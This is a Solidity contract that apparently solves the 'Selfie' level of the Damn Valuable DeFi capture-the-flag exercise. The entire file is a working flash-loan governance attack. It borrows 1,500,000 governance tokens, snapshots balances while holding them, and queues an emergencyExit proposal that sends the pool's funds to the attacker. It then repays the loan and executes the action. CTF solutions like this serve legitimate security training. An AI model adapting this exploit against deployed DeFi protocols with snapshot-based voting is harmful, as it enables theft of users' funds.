// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../selfie/SelfiePool.sol";

contract SelfieExploit {
    SimpleGovernance private governance;
    SelfiePool private pool;
    DamnValuableTokenSnapshot private token;

    address private owner;
    uint256 private actionId;
    uint256 public amount = 1500000 ether;

    constructor(address _token, address _governance, address _pool) {
        owner = msg.sender;
        token = DamnValuableTokenSnapshot(_token);
        governance = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
    }

    function getLoan() public {
        // Encode data for flash loan callback
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            address(owner)
        );

        // Flash loan
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            amount,
            data
        );
    }

    function onFlashLoan(
        address,
        address,
        uint256 _amount,
        uint256,
        bytes calldata data
    ) public payable returns (bytes32) {
        // Check if loan is received
        require(
            token.balanceOf(address(this)) == 1500000 ether,
            "Loan not received"
        );

        // Snapshot token balance
        token.snapshot();

        // Get Action ID
        actionId = governance.getActionCounter();

        // Submit malicious proposal
        governance.queueAction(address(pool), 0, data);

        // Approve funds to repay flash loan
        token.approve(address(pool), _amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function execute() external {
        governance.executeAction(actionId);
    }
}
